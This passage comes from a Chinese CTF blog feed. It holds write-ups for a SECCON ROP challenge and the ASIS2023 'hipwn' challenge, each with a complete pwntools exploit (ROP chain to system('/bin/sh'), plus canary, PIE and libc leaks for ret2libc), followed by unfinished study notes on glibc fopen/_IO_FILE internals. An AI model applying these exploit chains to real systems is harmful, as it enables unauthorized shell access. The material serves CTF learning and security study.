title="其它题解"></a>其它题解</h2><p>赛后发现这个题解更简单暴力</p><p>利用了main函数在返回时rdi是一个可写的地址(这就要去观察了,光理论分析要分析出有点难度)</p><p>于是在返回时直接调用gets@plt</p><p>然后又利用gets的返回值就是指向输入字符串的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure><p>再加上面的gadget</p><p>就可以直接利用了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p, u = pack, unpack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rop-2-35.seccon.games&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x401110</span></span><br><span class="line">mov_rdi_rax_call_system = <span class="number">0x401169</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(mov_rdi_rax_call_system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;//////////////////bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive(prompt=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>至于为什么要这么多<code>/</code>,不是很清楚但能观察到输入的字符串前面的某一个字符会变成其<code>ascii-1</code>对应的字符,例如<code>/</code>变为<code>.</code>,如果直接填<code>/bin/sh\x00</code>会变为<code>/bim/sh\x00</code></p><h1 id="ASIS2023-hipwn"><a href="#ASIS2023-hipwn" class="headerlink" title="ASIS2023_hipwn"></a>ASIS2023_hipwn</h1><p><strong>标签:栈溢出|ret2libc|rop</strong></p><p><strong>难度:1</strong></p><p><strong>题目介绍:</strong>can you pwn??</p><p> <strong>解析:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nbytes[<span class="number">72</span>]; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much???&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok... now send content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;nbytes[<span class="number">4</span>], *(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes);</span><br><span class="line">    nbytes[*(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes + <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;nbytes[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wanna do it again?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)nbytes != <span class="number">0x539</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i knew it&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec,保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>很常规的一道<strong>ret2libc</strong>题,但踩了不少坑</p><p>实现如下:</p><ol><li>泄露canary</li><li>泄露程序加载基址</li><li>泄露libc</li><li>rop</li></ol><p>观察一下栈</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-09-23_225025.png" alt=""></p><p>利用main泄露程序加载基址</p><p>利用libc_start_main泄露libc</p><p>常规处理,没有什么特殊的</p><p>最后所有流程都完成但运行无法正常getshell,猜测是栈不对齐,加一个ret即可</p><p><strong>exp:</strong>只适配了远程,但大致是这么个流程</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#from LibcSearcher import*</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">prdi=<span class="number">0x2a3e5</span></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;45.153.243.57&#x27;,1337)</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">code=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11c9</span></span><br><span class="line">puts_got=code+<span class="number">0x3fd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(code))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x80</span>-<span class="number">0x29dc0</span></span><br><span class="line">p.recv()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1024&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(canary)+p64(<span class="number">0x1</span>)+p64(libc_base+prdi)+p64(libc_base+<span class="number">0x1d8698</span>)+p64(code+<span class="number">0x101a</span>)+p64(libc_base+<span class="number">0x050d60</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;133&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;133&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;again?\n&#x27;)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#print(hex(puts_addr))</span></span><br><span class="line"><span class="comment">#libc=puts_addr-0x84ed0</span></span><br><span class="line"><span class="comment">#one=libc+0xeeccc</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1337&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1024&#x27;)</span></span><br></pre></td></tr></table></figure><h2 id="说一下踩的坑"><a href="#说一下踩的坑" class="headerlink" title="说一下踩的坑"></a>说一下踩的坑</h2><p>首先是程序没有给定libc版本,</p><p>然后我运行的环境是ubuntu20,gdb提示需要glibc_234</p><p>当时直接以为程序原本就是glibc234了,但实际上这是最小需求,真正可能libc版本更高</p><p>所以在泄露libc时,就出现了远程<code>__libc_start_main-125</code>并不能找到对应的libc的情况</p><p>即e40-7d=dc3无对应libc,当时压根没想到libc_start_main的函数偏移不同</p><p>脑子短路了一阵</p><p>之后利用更改rbp使得puts泄露got加以确定libc基址才回过神来</p><hr><p><strong>小知识点:</strong></p><p><strong>libc中绝大部分函数地址是十六进制对齐,小部分是八进制对齐,极小部分是其他情况</strong></p><p><strong>因此当计算出的地址不是十六进制或八进制对齐基本可以认为是本地偏移与远程偏移有差</strong></p><p><strong>可以就近对齐十六进制或八进制尝试</strong></p><p>或者泄露其他函数对照</p>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file函数学习</title>
      <link href="/posts/33400/"/>
      <url>/posts/33400/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学堆中_IO_FILE的利用,也就是各种how2heap了</p><p>发现对_IO_FILE的具体规则及代码运用其实还不是很熟悉</p><p>恰好发现了rap-cp和桑榆两个大佬的博客文章</p><p>认真学习了一番</p><p>并记录自己的学习收获</p><p>glibc使用2.31,因为自己的ubuntu默认libc是2.31的,比较方便</p><p>版本差异导致有些代码并不能完全对应,不过问题不大</p><hr><p>很多函数的原型不太好找是因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_ver(local, name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_ver(local, name)</span></span><br><span class="line"></span><br><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br></pre></td></tr></table></figure><p>等一系列原型隐藏符号映射宏</p><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><p>fopen实际上是 _IO_new_fopen函数，该函数在/libio/iofopen.c文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到_IO_new_fopen仅仅是调用了__fopen_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__fopen_internal其实就差不多已经包含了整个流程了</p><p>整个<code>__fopen_internal</code>函数包含四个部分：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>开头声明了一个结构体并实例化了一个对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br></pre></td></tr></table></figure><p>在64位系统中大小为0x230</p><p>该结构体包含三个结构体<code>_IO_FILE_plus</code>、<code>_IO_lock_t</code>、<code>_IO_wide_data</code>，其中<code>_IO_FILE_plus</code>为使用的<code>IO FILE</code>的结构体。</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><strong>_IO_no_init 对file结构体进行null初始化</strong></p><p>在分配完空间后，接着就调用<code>_IO_no_init</code>函数去null初始化结构体，跟进去该函数，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_old_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据参数初始化_IO_wide_data与_IO_FILE_plus,多数置为NULL</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p><strong>_IO_file_init将结构体链接进_IO_list_all</strong></p><p>在执行完<code>_IO_no_init</code>函数后，回到<code>__fopen_internal</code>函数，</p><p>函数将<code>_IO_FILE_plus</code>结构体的vtable设置成了<code>_IO_file_jumps</code>，</p><p>然后调用<code>_IO_file_init_internal</code>将<code>_IO_FILE_plus</code>结构体链接进入<code>_IO_list_all</code>链表，跟进去函数，函数在<code>/libio/fileops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= 